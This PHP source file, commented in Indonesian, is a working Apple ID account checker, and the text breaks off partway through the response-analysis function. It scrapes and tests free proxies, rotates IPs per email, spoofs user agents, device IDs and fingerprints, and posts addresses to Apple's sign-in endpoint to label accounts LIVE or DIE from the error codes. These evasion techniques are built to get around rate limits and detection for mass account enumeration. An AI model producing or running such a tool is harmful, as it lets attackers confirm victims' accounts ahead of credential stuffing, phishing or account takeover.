<?php
/**
 * Apple ID Email Checker - Full Version with Auto Proxy Grab & IP Rotation
 * 
 * Fitur:
 * - Auto grab proxy dari multiple sumber gratis
 * - IP rotation: setiap email menggunakan proxy berbeda
 * - Test proxy sebelum digunakan
 * - Multi-thread / concurrent checking
 * - Export hasil lengkap
 * 
 * Endpoint: https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true
 * 
 * Kode Error:
 * -20101 : DIE - Akun tidak valid / tidak ditemukan
 * -20201 : LIVE - Akun valid, memerlukan 2FA
 * -20283 : LIVE - Akun valid, trusted device
 */

class ProxyGrabber
{
    private $proxies = [];
    private $testedProxies = [];
    private $failedProxies = [];
    private $proxyIndex = 0;
    private $testUrl = 'https://httpbin.org/ip';
    private $testTimeout = 10;
    private $maxProxies = 500;  // Masih private
    
    /**
     * Set max proxies limit
     */
    public function setMaxProxies(int $max): self
    {
        $this->maxProxies = max(1, $max);
        return $this;
    }
    
    /**
     * Get max proxies limit
     */
    public function getMaxProxies(): int
    {
        return $this->maxProxies;
    }
    
    // ... sisanya method-method lain tetap sama ...

    /**
     * Auto grab proxy dari berbagai sumber gratis
     */
    public function grabFromAllSources(): array
    {
        echo "[*] Mengambil proxy dari semua sumber...\n";
        
        $sources = [
            [$this, 'grabFromProxifly'],
            [$this, 'grabFromProxyScrape'],
            [$this, 'grabFromSpeedX'],
            [$this, 'grabFromGeonode'],
            [$this, 'grabFromFreeProxyList'],
            [$this, 'grabFromPubProxy'],
            [$this, 'grabFromOpenProxySpace'],
            [$this, 'grabFromSSLProxy'],
        ];
        
        $allProxies = [];
        foreach ($sources as $source) {
            try {
                $proxies = call_user_func($source);
                if (!empty($proxies)) {
                    $allProxies = array_merge($allProxies, $proxies);
                    echo "[+] " . count($proxies) . " proxy dari " . $this->getSourceName($source) . "\n";
                }
            } catch (\Exception $e) {
                echo "[-] Gagal grab dari " . $this->getSourceName($source) . ": " . $e->getMessage() . "\n";
            }
        }
        
        // Hapus duplikat
        $allProxies = array_unique($allProxies);
        $allProxies = array_values($allProxies);
        
        // Batasi jumlah
        if (count($allProxies) > $this->maxProxies) {
            shuffle($allProxies);
            $allProxies = array_slice($allProxies, 0, $this->maxProxies);
        }
        
        echo "[*] Total proxy terkumpul: " . count($allProxies) . "\n";
        
        $this->proxies = $allProxies;
        return $allProxies;
    }
    
    private function getSourceName($callback): string
    {
        $names = [
            'grabFromProxifly' => 'Proxifly',
            'grabFromProxyScrape' => 'ProxyScrape',
            'grabFromSpeedX' => 'SpeedX List',
            'grabFromGeonode' => 'Geonode',
            'grabFromFreeProxyList' => 'Free-Proxy-List.net',
            'grabFromPubProxy' => 'PubProxy',
            'grabFromOpenProxySpace' => 'OpenProxySpace',
            'grabFromSSLProxy' => 'SSL Proxy',
        ];
        $func = is_array($callback) ? $callback[1] : '';
        return $names[$func] ?? 'Unknown';
    }
    
    /**
     * Grab dari Proxifly (GitHub)
     */
    public function grabFromProxifly(): array
    {
        $urls = [
            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/https/data.txt',
            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt',
            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt',
        ];
        
        $proxies = [];
        foreach ($urls as $url) {
            $content = $this->fetchUrl($url);
            if ($content) {
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
                        $proxies[] = 'http://' . $line;
                    } elseif (!empty($line) && preg_match('/^https?:\/\/[\d.]+:\d+$/', $line)) {
                        $proxies[] = $line;
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari ProxyScrape API
     */
    public function grabFromProxyScrape(): array
    {
        $proxies = [];
        
        // HTTP proxies
        $url = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http';
        $content = $this->fetchUrl($url);
        if ($content) {
            $lines = explode("\n", $content);
            foreach ($lines as $line) {
                $line = trim($line);
                if (!empty($line)) {
                    if (strpos($line, '://') === false) {
                        $proxies[] = 'http://' . $line;
                    } else {
                        $proxies[] = $line;
                    }
                }
            }
        }
        
        // SOCKS4 proxies
        $url = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks4';
        $content = $this->fetchUrl($url);
        if ($content) {
            $lines = explode("\n", $content);
            foreach ($lines as $line) {
                $line = trim($line);
                if (!empty($line)) {
                    if (strpos($line, '://') === false) {
                        $proxies[] = 'socks4://' . $line;
                    } else {
                        $proxies[] = $line;
                    }
                }
            }
        }
        
        // SOCKS5 proxies
        $url = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5';
        $content = $this->fetchUrl($url);
        if ($content) {
            $lines = explode("\n", $content);
            foreach ($lines as $line) {
                $line = trim($line);
                if (!empty($line)) {
                    if (strpos($line, '://') === false) {
                        $proxies[] = 'socks5://' . $line;
                    } else {
                        $proxies[] = $line;
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari SpeedX List (GitHub)
     */
    public function grabFromSpeedX(): array
    {
        $urls = [
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
        ];
        
        $proxies = [];
        $protocols = ['http', 'socks4', 'socks5'];
        
        foreach ($urls as $i => $url) {
            $content = $this->fetchUrl($url);
            if ($content) {
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
                        $proxies[] = $protocols[$i] . '://' . $line;
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari Geonode
     */
    public function grabFromGeonode(): array
    {
        $proxies = [];
        
        for ($page = 1; $page <= 5; $page++) {
            $url = "https://proxylist.geonode.com/api/proxy-list?limit=100&page=$page&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps%2Csocks4%2Csocks5";
            $content = $this->fetchUrl($url);
            
            if ($content) {
                $data = json_decode($content, true);
                if (isset($data['data']) && is_array($data['data'])) {
                    foreach ($data['data'] as $proxy) {
                        $ip = $proxy['ip'] ?? '';
                        $port = $proxy['port'] ?? '';
                        $protocols = $proxy['protocols'] ?? ['http'];
                        $protocol = strtolower($protocols[0] ?? 'http');
                        
                        if (!empty($ip) && !empty($port)) {
                            $proxies[] = "$protocol://$ip:$port";
                        }
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari Free-Proxy-List.net
     */
    public function grabFromFreeProxyList(): array
    {
        $proxies = [];
        
        // HTTP proxies
        $url = 'https://free-proxy-list.net/';
        $content = $this->fetchUrl($url);
        
        if ($content) {
            $dom = new DOMDocument();
            @$dom->loadHTML($content);
            $xpath = new DOMXPath($dom);
            $rows = $xpath->query('//table[@id="proxylisttable"]/tbody/tr');
            
            foreach ($rows as $row) {
                $cols = $row->getElementsByTagName('td');
                if ($cols->length >= 8) {
                    $ip = trim($cols->item(0)->textContent);
                    $port = trim($cols->item(1)->textContent);
                    $https = trim($cols->item(6)->textContent);
                    
                    if (!empty($ip) && !empty($port)) {
                        $protocol = ($https === 'yes') ? 'https' : 'http';
                        $proxies[] = "$protocol://$ip:$port";
                    }
                }
            }
        }
        
        // SSL/HTTPS proxies
        $url = 'https://www.sslproxies.org/';
        $content = $this->fetchUrl($url);
        
        if ($content) {
            $dom = new DOMDocument();
            @$dom->loadHTML($content);
            $xpath = new DOMXPath($dom);
            $rows = $xpath->query('//table[@id="proxylisttable"]/tbody/tr');
            
            foreach ($rows as $row) {
                $cols = $row->getElementsByTagName('td');
                if ($cols->length >= 8) {
                    $ip = trim($cols->item(0)->textContent);
                    $port = trim($cols->item(1)->textContent);
                    
                    if (!empty($ip) && !empty($port)) {
                        $proxies[] = "https://$ip:$port";
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari PubProxy API
     */
    public function grabFromPubProxy(): array
    {
        $proxies = [];
        
        for ($i = 0; $i < 5; $i++) {
            $url = 'http://pubproxy.com/api/proxy?limit=5&format=json&http=true&https=true&socks4=true&socks5=true&type=elite';
            $content = $this->fetchUrl($url);
            
            if ($content) {
                $data = json_decode($content, true);
                if (isset($data['data']) && is_array($data['data'])) {
                    foreach ($data['data'] as $proxy) {
                        $ip = $proxy['ip'] ?? '';
                        $port = $proxy['port'] ?? '';
                        $type = strtolower($proxy['type'] ?? 'http');
                        
                        if (!empty($ip) && !empty($port)) {
                            $proxies[] = "$type://$ip:$port";
                        }
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari OpenProxySpace
     */
    public function grabFromOpenProxySpace(): array
    {
        $proxies = [];
        
        $urls = [
            'http://openproxyspace.com/http.txt',
            'http://openproxyspace.com/socks4.txt',
            'http://openproxyspace.com/socks5.txt',
        ];
        $protocols = ['http', 'socks4', 'socks5'];
        
        foreach ($urls as $i => $url) {
            $content = $this->fetchUrl($url);
            if ($content) {
                $lines = explode("\n", $content);
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
                        $proxies[] = $protocols[$i] . '://' . $line;
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Grab dari SSL Proxy
     */
    public function grabFromSSLProxy(): array
    {
        $proxies = [];
        
        $url = 'https://sslproxies.org/';
        $content = $this->fetchUrl($url);
        
        if ($content) {
            $dom = new DOMDocument();
            @$dom->loadHTML($content);
            $xpath = new DOMXPath($dom);
            $rows = $xpath->query('//table[@class="table table-striped table-bordered"]/tbody/tr');
            
            foreach ($rows as $row) {
                $cols = $row->getElementsByTagName('td');
                if ($cols->length >= 8) {
                    $ip = trim($cols->item(0)->textContent);
                    $port = trim($cols->item(1)->textContent);
                    
                    if (!empty($ip) && !empty($port)) {
                        $proxies[] = "https://$ip:$port";
                    }
                }
            }
        }
        
        return $proxies;
    }
    
    /**
     * Fetch URL content dengan fallback
     */
    private function fetchUrl(string $url): ?string
    {
        $context = stream_context_create([
            'http' => [
                'timeout' => 15,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'header' => "Accept: text/html,application/json,*/*\r\n",
                'ignore_errors' => true,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
        ]);
        
        $content = @file_get_contents($url, false, $context);
        
        // Fallback ke curl jika file_get_contents gagal
        if ($content === false) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_FOLLOWLOCATION => true,
            ]);
            $content = curl_exec($ch);
            curl_close($ch);
        }
        
        return $content !== false ? $content : null;
    }
    
    /**
     * Test proxy apakah berfungsi
     */
    public function testProxy(string $proxy): bool
    {
        $parsed = parse_url($proxy);
        $protocol = $parsed['scheme'] ?? 'http';
        $host = $parsed['host'] ?? '';
        $port = $parsed['port'] ?? 80;
        
        $proxyTypeMap = [
            'http' => CURLPROXY_HTTP,
            'https' => CURLPROXY_HTTPS,
            'socks4' => CURLPROXY_SOCKS4,
            'socks5' => CURLPROXY_SOCKS5,
        ];
        
        $proxyType = $proxyTypeMap[$protocol] ?? CURLPROXY_HTTP;
        
        $ch = curl_init($this->testUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $this->testTimeout,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_PROXY => "$host:$port",
            CURLOPT_PROXYTYPE => $proxyType,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        $working = ($response !== false && $httpCode === 200);
        
        if ($working) {
            $this->testedProxies[] = $proxy;
        } else {
            $this->failedProxies[] = $proxy;
        }
        
        return $working;
    }
    
    /**
     * Test semua proxy dan return hanya yang working
     */
    public function testAllProxies(array $proxies = null, int $concurrent = 20): array
    {
        $toTest = $proxies ?? $this->proxies;
        $working = [];
        $total = count($toTest);
        
        echo "[*] Testing " . $total . " proxy...\n";
        
        $batchSize = $concurrent;
        $batches = array_chunk($toTest, $batchSize);
        
        foreach ($batches as $batchIndex => $batch) {
            $results = [];
            $start = $batchIndex * $batchSize;
            
            // Gunakan curl multi untuk concurrent testing
            $mh = curl_multi_init();
            $curlHandles = [];
            
            foreach ($batch as $i => $proxy) {
                $parsed = parse_url($proxy);
                $protocol = $parsed['scheme'] ?? 'http';
                $host = $parsed['host'] ?? '';
                $port = $parsed['port'] ?? 80;
                
                $proxyTypeMap = [
                    'http' => CURLPROXY_HTTP,
                    'https' => CURLPROXY_HTTPS,
                    'socks4' => CURLPROXY_SOCKS4,
                    'socks5' => CURLPROXY_SOCKS5,
                ];
                $proxyType = $proxyTypeMap[$protocol] ?? CURLPROXY_HTTP;
                
                $ch = curl_init($this->testUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => $this->testTimeout,
                    CURLOPT_CONNECTTIMEOUT => 5,
                    CURLOPT_PROXY => "$host:$port",
                    CURLOPT_PROXYTYPE => $proxyType,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => 'Mozilla/5.0',
                    CURLOPT_PRIVATE => $proxy,
                ]);
                
                curl_multi_add_handle($mh, $ch);
                $curlHandles[] = $ch;
            }
            
            // Execute all handles
            $running = null;
            do {
                curl_multi_exec($mh, $running);
                curl_multi_select($mh);
            } while ($running > 0);
            
            // Get results
            foreach ($curlHandles as $ch) {
                $proxy = curl_getinfo($ch, CURLINFO_PRIVATE);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $response = curl_multi_getcontent($ch);
                $error = curl_error($ch);
                
                if ($response !== false && $httpCode === 200 && empty($error)) {
                    $working[] = $proxy;
                    $this->testedProxies[] = $proxy;
                } else {
                    $this->failedProxies[] = $proxy;
                }
                
                curl_multi_remove_handle($mh, $ch);
                curl_close($ch);
            }
            
            curl_multi_close($mh);
            
            $tested = min(($batchIndex + 1) * $batchSize, $total);
            echo "\r[+] Tested: $tested/$total | Working: " . count($working) . "        ";
        }
        
        echo "\n[*] Proxy working: " . count($working) . " dari " . $total . "\n";
        
        $this->proxies = $working;
        return $working;
    }
    
    /**
     * Get next proxy untuk rotation
     */
    public function getNextProxy(): ?string
    {
        if (empty($this->proxies)) {
            return null;
        }
        
        $proxy = $this->proxies[$this->proxyIndex % count($this->proxies)];
        $this->proxyIndex++;
        
        return $proxy;
    }
    
    /**
     * Reset proxy index
     */
    public function resetRotation(): void
    {
        $this->proxyIndex = 0;
    }
    
    /**
     * Get jumlah proxy yang available
     */
    public function getAvailableProxyCount(): int
    {
        return count($this->proxies);
    }
    
    /**
     * Save proxy list ke file
     */
    public function saveToFile(string $filePath, array $proxies = null): bool
    {
        $toSave = $proxies ?? $this->proxies;
        return file_put_contents($filePath, implode("\n", $toSave)) !== false;
    }
    
    /**
     * Load proxy dari file
     */
    public function loadFromFile(string $filePath): array
    {
        if (!file_exists($filePath)) {
            return [];
        }
        
        $content = file_get_contents($filePath);
        $lines = explode("\n", $content);
        $proxies = [];
        
        foreach ($lines as $line) {
            $line = trim($line);
            if (!empty($line)) {
                if (strpos($line, '://') === false) {
                    $proxies[] = 'http://' . $line;
                } else {
                    $proxies[] = $line;
                }
            }
        }
        
        $this->proxies = $proxies;
        return $proxies;
    }
    
    /**
     * Get tested proxies
     */
    public function getTestedProxies(): array
    {
        return $this->testedProxies;
    }
    
    /**
     * Get failed proxies
     */
    public function getFailedProxies(): array
    {
        return $this->failedProxies;
    }
}

class AppleEmailChecker
{
    private $baseUrl = 'https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true';
    private $initUrl = 'https://idmsa.apple.com/appleauth/auth/signin/init';
    private $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    private $acceptLanguage = 'en-US,en;q=0.9';
    private $timeout = 30;
    private $proxyGrabber;
    private $useProxyRotation = true;
    private $verbose = false;
    private $delayBetweenRequests = 1000000; // 1 detik default
    private $maxRetries = 2;
    private $results = [];
    private $stats = [
        'total' => 0,
        'live' => 0,
        'die' => 0,
        'locked' => 0,
        'error' => 0,
        'unknown' => 0,
        'proxy_rotations' => 0,
    ];
    
    private $userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    ];
    
    public function __construct()
    {
        $this->proxyGrabber = new ProxyGrabber();
    }
    
    /**
     * Set proxy grabber instance
     */
    public function setProxyGrabber(ProxyGrabber $grabber): self
    {
        $this->proxyGrabber = $grabber;
        return $this;
    }
    
    /**
     * Get proxy grabber instance
     */
    public function getProxyGrabber(): ProxyGrabber
    {
        return $this->proxyGrabber;
    }
    
    /**
     * Enable/disable proxy rotation
     */
    public function setProxyRotation(bool $enable): self
    {
        $this->useProxyRotation = $enable;
        return $this;
    }
    
    /**
     * Set timeout
     */
    public function setTimeout(int $seconds): self
    {
        $this->timeout = $seconds;
        return $this;
    }
    
    /**
     * Set delay between requests in microseconds
     */
    public function setDelay(int $microseconds): self
    {
        $this->delayBetweenRequests = $microseconds;
        return $this;
    }
    
    /**
     * Set max retries per email
     */
    public function setMaxRetries(int $retries): self
    {
        $this->maxRetries = $retries;
        return $this;
    }
    
    /**
     * Enable verbose
     */
    public function setVerbose(bool $verbose): self
    {
        $this->verbose = $verbose;
        return $this;
    }
    
    /**
     * Get random User-Agent
     */
    private function getRandomUserAgent(): string
    {
        return $this->userAgents[array_rand($this->userAgents)];
    }
    
    /**
     * Generate random fingerprint
     */
    private function getRandomFingerprint(): string
    {
        return bin2hex(random_bytes(16));
    }
    
    /**
     * Generate request context
     */
    private function generateRequestContext(): string
    {
        return strtoupper(dechex(time())) . '-' . strtoupper(dechex(rand(1000, 9999)));
    }
    
    /**
     * Generate device ID
     */
    private function generateDeviceId(): string
    {
        $data = random_bytes(16);
        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }
    
    /**
     * Get client info header
     */
    private function getClientInfo(): string
    {
        $ua = $this->getRandomUserAgent();
        return json_encode([
            'U' => $ua,
            'L' => 'en-US',
            'Z' => 'GMT+' . sprintf('%02d:00', rand(0, 12)),
            'V' => '1.1',
            'F' => $this->getRandomFingerprint(),
        ]);
    }
    
    /**
     * Parse proxy string into components
     */
    private function parseProxy(string $proxy): array
    {
        $parsed = parse_url($proxy);
        $protocol = $parsed['scheme'] ?? 'http';
        $host = $parsed['host'] ?? '';
        $port = $parsed['port'] ?? 80;
        
        $proxyTypeMap = [
            'http' => CURLPROXY_HTTP,
            'https' => CURLPROXY_HTTPS,
            'socks4' => CURLPROXY_SOCKS4,
            'socks5' => CURLPROXY_SOCKS5,
        ];
        
        return [
            'protocol' => $protocol,
            'host' => $host,
            'port' => $port,
            'type' => $proxyTypeMap[$protocol] ?? CURLPROXY_HTTP,
            'string' => "$host:$port",
        ];
    }
    
    /**
     * Get session dari Apple
     */
    private function getSession(?string $proxy = null): array
    {
        $ua = $this->getRandomUserAgent();
        
        $ch = curl_init($this->initUrl);
        $options = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_USERAGENT => $ua,
            CURLOPT_HTTPHEADER => [
                'Accept: application/json, text/plain, */*',
                'Accept-Language: ' . $this->acceptLanguage,
                'Accept-Encoding: gzip, deflate, br',
                'Referer: https://appleid.apple.com/',
                'Origin: https://appleid.apple.com',
                'Connection: keep-alive',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-site',
            ],
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_ENCODING => 'gzip, deflate, br',
            CURLOPT_COOKIEFILE => '',
            CURLOPT_COOKIEJAR => '',
        ];
        
        if ($proxy && $this->useProxyRotation) {
            $p = $this->parseProxy($proxy);
            $options[CURLOPT_PROXY] = $p['string'];
            $options[CURLOPT_PROXYTYPE] = $p['type'];
        }
        
        curl_setopt_array($ch, $options);
        $response = curl_exec($ch);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        // Parse cookies
        preg_match_all('/^Set-Cookie:\s*([^=]+)=([^;]+)/mi', $headers, $matches);
        $cookies = [];
        foreach ($matches[1] as $i => $name) {
            $cookies[trim($name)] = trim($matches[2][$i]);
        }
        
        // Parse scnt
        preg_match('/^scnt:\s*(.+)$/mi', $headers, $scntMatch);
        $scnt = isset($scntMatch[1]) ? trim($scntMatch[1]) : '';
        
        // Parse widget key dari body
        $bodyData = json_decode($body, true);
        $widgetKey = $bodyData['widgetKey'] ?? 'd39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d';
        
        return [
            'cookies' => $cookies,
            'scnt' => $scnt,
            'widgetKey' => $widgetKey,
            'httpCode' => $httpCode,
            'error' => $error,
        ];
    }
    
    /**
     * Check single email dengan proxy rotation
     */
    public function check(string $email, ?string $proxy = null): array
    {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return [
                'email' => $email,
                'status' => 'ERROR',
                'status_label' => 'Invalid Email Format',
                'http_code' => 0,
                'error_code' => null,
                'message' => 'Email format is invalid',
                'proxy_used' => $proxy,
            ];
        }
        
        $retryCount = 0;
        $lastError = '';
        
        while ($retryCount <= $this->maxRetries) {
            // Auto get proxy jika tidak disediakan
            if ($this->useProxyRotation && $proxy === null) {
                $proxy = $this->proxyGrabber->getNextProxy();
                if ($proxy) {
                    $this->stats['proxy_rotations']++;
                }
            }
            
            if ($this->verbose) {
                $proxyInfo = $proxy ? " via $proxy" : " (direct)";
                echo "[DEBUG] Checking $email$proxyInfo (attempt " . ($retryCount + 1) . ")\n";
            }
            
            try {
                // Get session
                $session = $this->getSession($proxy);
                
                // Build cookie string
                $cookieStr = '';
                foreach ($session['cookies'] as $name => $value) {
                    $cookieStr .= "$name=$value; ";
                }
                $cookieStr = rtrim($cookieStr, '; ');
                
                $ua = $this->getRandomUserAgent();
                $deviceId = $this->generateDeviceId();
                $requestContext = $this->generateRequestContext();
                $clientInfo = $this->getClientInfo();
                
                $headers = [
                    'Accept: application/json, text/plain, */*',
                    'Accept-Language: ' . $this->acceptLanguage,
                    'Accept-Encoding: gzip, deflate, br',
                    'Content-Type: application/json',
                    'Referer: https://appleid.apple.com/',
                    'Origin: https://appleid.apple.com',
                    'Connection: keep-alive',
                    'Cookie: ' . $cookieStr,
                    'X-Apple-I-FD-Client-Info: ' . $clientInfo,
                    'X-Apple-Request-Context: ' . $requestContext,
                    'X-Apple-I-Device-Id: ' . $deviceId,
                    'X-Apple-Widget-Key: ' . $session['widgetKey'],
                    'X-Requested-With: XMLHttpRequest',
                    'Sec-Fetch-Dest: empty',
                    'Sec-Fetch-Mode: cors',
                    'Sec-Fetch-Site: same-site',
                ];
                
                if (!empty($session['scnt'])) {
                    $headers[] = 'X-Apple-SCNT: ' . $session['scnt'];
                }
                
                $payload = json_encode(['accountName' => $email]);
                
                $ch = curl_init($this->baseUrl);
                $options = [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $payload,
                    CURLOPT_USERAGENT => $ua,
                    CURLOPT_HTTPHEADER => $headers,
                    CURLOPT_TIMEOUT => $this->timeout,
                    CURLOPT_CONNECTTIMEOUT => 15,
                    CURLOPT_FOLLOWLOCATION => false,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_ENCODING => 'gzip, deflate, br',
                    CURLOPT_HEADER => true,
                ];
                
                if ($proxy && $this->useProxyRotation) {
                    $p = $this->parseProxy($proxy);
                    $options[CURLOPT_PROXY] = $p['string'];
                    $options[CURLOPT_PROXYTYPE] = $p['type'];
                }
                
                curl_setopt_array($ch, $options);
                $response = curl_exec($ch);
                $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                $responseBody = substr($response, $headerSize);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $error = curl_error($ch);
                curl_close($ch);
                
                if (!empty($error)) {
                    $lastError = $error;
                    $retryCount++;
                    if ($this->verbose) {
                        echo "[DEBUG] CURL Error: $error, retrying...\n";
                    }
                    // Ganti proxy untuk retry
                    if ($this->useProxyRotation) {
                        $proxy = $this->proxyGrabber->getNextProxy();
                        $this->stats['proxy_rotations']++;
                    }
                    usleep(500000); // 0.5 detik sebelum retry
                    continue;
                }
                
                $data = json_decode($responseBody, true);
                $result = $this->analyzeResponse($email, $httpCode, $data, $responseBody, $proxy);
                
                // Update stats
                $this->stats['total']++;
                switch ($result['status']) {
                    case 'LIVE': $this->stats['live']++; break;
                    case 'DIE': $this->stats['die']++; break;
                    case 'LOCKED': $this->stats['locked']++; break;
                    case 'ERROR': $this->stats['error']++; break;
                    default: $this->stats['unknown']++; break;
                }
                
                $this->results[] = $result;
                
                return $result;
                
            } catch (\Exception $e) {
                $lastError = $e->getMessage();
                $retryCount++;
                if ($this->verbose) {
                    echo "[DEBUG] Exception: " . $e->getMessage() . ", retrying...\n";
                }
                if ($this->useProxyRotation) {
                    $proxy = $this->proxyGrabber->getNextProxy();
                    $this->stats['proxy_rotations']++;
                }
                usleep(500000);
            }
        }
        
        // Jika semua retry gagal
        $result = [
            'email' => $email,
            'status' => 'ERROR',
            'status_label' => 'Max Retries Exceeded',
            'http_code' => 0,
            'error_code' => null,
            'message' => 'Failed after ' . ($this->maxRetries + 1) . ' attempts: ' . $lastError,
            'proxy_used' => $proxy,
        ];
        
        $this->stats['total']++;
        $this->stats['error']++;
        $this->results[] = $result;
        
        return $result;
    }
    
    /**
     * Analyze response
     */
    private function analyzeResponse(string $email, int $httpCode, ?array $data, string $rawResponse, ?string $proxy = null): array
    {
        $result = [
            'email' => $email,
            'status' => 'UNKNOWN',
            'status_label' => 'Unknown',
            'http_code' => $httpCode,
            'error_code' => null,
            'message' => '',
            'proxy_used' => $proxy,
        ];
        
        // Cek service errors
        if (isset($data['serviceErrors']) && is_array($data['serviceErrors'])) {
            foreach ($data['serviceErrors'] as $error) {
                $code = $error['code'] ?? '';
                $errorMessage = $error['message'] ?? '';
                
                switch ($code) {
                    case '-20101':
                        $result['status'] = 'DIE';
                        $result['status_label'] = 'Dead / Invalid';
                        $result['error_code'] = '-20101';
                        $result['message'] = !empty($errorMessage) ? $errorMessage : 'Account not found or invalid credentials';
                        return $result;
                        
                    case '-20201':
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (2FA Required)';
                        $result['error_code'] = '-20201';
                        $result['message'] = !empty($errorMessage) ? $errorMessage : 'Account exists, requires 2FA verification';
                        return $result;
                        
                    case '-20283':
                        $result['status'] = 'LIVE';
                        $result['status_label'] = 'Live (Trusted Device)';
                        $result['error_code'] = '-20283';
